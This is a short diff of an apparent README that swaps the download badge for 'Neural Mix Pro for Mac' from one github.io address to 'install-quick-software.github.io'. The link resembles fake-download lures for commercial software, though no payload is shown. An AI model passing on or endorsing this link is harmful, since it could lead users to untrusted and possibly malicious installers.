@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![📥 Download Neural Mix Pro Mac](https://img.shields.io/badge/📥_Download_Neural_Mix_Pro_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/neuralmix)
+[![📥 Download Neural Mix Pro Mac](https://img.shields.io/badge/📥_Download_Neural_Mix_Pro_for_Mac-blue?style=for-the-badge&logo=apple)](https://install-quick-software.github.io/.github/neuralmix)
 
 </div>
 
